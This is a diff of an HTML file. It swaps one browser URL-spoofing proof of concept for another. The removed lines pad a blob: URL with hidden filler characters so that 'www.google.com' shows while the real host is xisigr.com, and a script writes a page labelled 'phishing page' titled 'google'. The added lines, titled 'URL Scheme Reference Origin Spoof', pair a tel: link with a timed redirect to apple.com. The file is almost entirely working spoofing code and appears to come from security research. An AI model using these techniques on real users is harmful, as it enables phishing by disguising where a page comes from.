@@ -1,10 +1,17 @@
-<script>
-function pwned() {
-    var t = window.open('', 'ss');
-    t.document.write("<h1>phishing page</h1><title>google</title>");
-    t.stop();
-}
-</script>
-<a href="blob:http://www.google.com%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0%EF%BE%A0@xisigr.com" target="ss" onclick="setTimeout('pwned()','500')">click me1</a><br>
-<br>
-<a href="blob:http://www.google.com                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    @xisigr.com" target="ss" onclick="setTimeout('pwned()','500')">click me2</a><br>
+<!DOCTYPE html>
+<html>
+    <head>
+        <meta charset="utf-8">
+        <title>URL Scheme Reference Origin Spoof</title>
+    </head>
+    <body>
+        <a id="contact" onclick="contactSite()" href="tel:+12345678910">Contact Apple</a>
+        <script type="text/javascript">
+            function contactSite() {
+                setTimeout(function() {
+                    location.href = "https://www.apple.com/contact";
+                }, 1);
+            }
+        </script>
+    </body>
+</html>
